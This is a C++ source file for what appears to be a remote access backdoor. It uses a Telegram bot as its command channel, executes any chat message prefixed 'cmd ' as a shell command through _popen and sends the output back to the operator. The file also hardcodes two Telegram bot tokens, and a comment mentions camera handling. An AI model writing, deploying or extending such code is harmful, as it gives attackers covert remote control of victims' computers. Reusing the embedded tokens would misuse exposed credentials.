#include "Client.h"

//TgBot::Bot bot("1139152301:AAEd_ZL0oyhGHd7aMykZhRpOoa2-76fsuow");

Client::Client(){
    bot = make_unique<TgBot::Bot>("1221166615:AAGr7IUBGUcBPFLLZ8OYo1ZwwxZmzcRM2bM");
}

string Client::exec(string& cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) {
        return "There is an error with the command " + cmd;
    }
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    }
    catch (...) {
        _pclose(pipe);
        return "There is an error with the command " + cmd;
    }
    _pclose(pipe);
    return result;
}

//Getting command from the server v
string Client::getTGMessage(unique_ptr<TgBot::Bot> &bot) {
    string msg;
    bot->getEvents().onAnyMessage([&](TgBot::Message::Ptr message) {
        printf("User wrote %s\n", message->text.c_str());
        chatId = message->chat->id;
        msg = message->text;
        return message->text;
        //bot->getApi().sendMessage(message->chat->id, message->text);
        });
    try {
        printf("Bot username: %s\n", bot->getApi().getMe()->username.c_str());
        TgBot::TgLongPoll longPoll(*bot);
        longPoll.start();
        return msg;
    }
    catch (TgBot::TgException& e) {
        printf("error: %s\n", e.what());
        return msg;
    }
    return msg;
}


//Sending command to the server via the bot
void Client::sendTGMessage(unique_ptr<TgBot::Bot>&bot , string message) {
    bot->getApi().sendMessage(chatId, message);
    return;
}



void Client::connection() {

    //The command from the server
    string command;

    //Checking if the last command is same as the new command
    string equalCommand;

    while (true) {
        std::cout << "Test" << endl;
        //ZeroMemory(buf, 1024);
        //bytesReceived = recv(sock, buf, 1024, 0);
       
        command = getTGMessage(bot);
        
        if(command == equalCommand){
            continue;
        }
        else {
            equalCommand = command;
        }



        //There is a bug when disconnecting the camera (The program crash)
        
        if (command.rfind("cmd ") == 0) {
            //Deleting the first 4 (cmd ) characters from the command
            command = command.substr(4, command.size() - 1);
            //Execute the command and saving the output in output
            string output = exec(command);
            //Send the results to the server
            sendTGMessage(bot, output);
            
        }
        else {
            //The command is not exist
            string cantFind = "The command " + command + " was not found";
            sendTGMessage(bot ,cantFind.c_str());
        }
    }
    std::cout << "End of the program" << endl;
}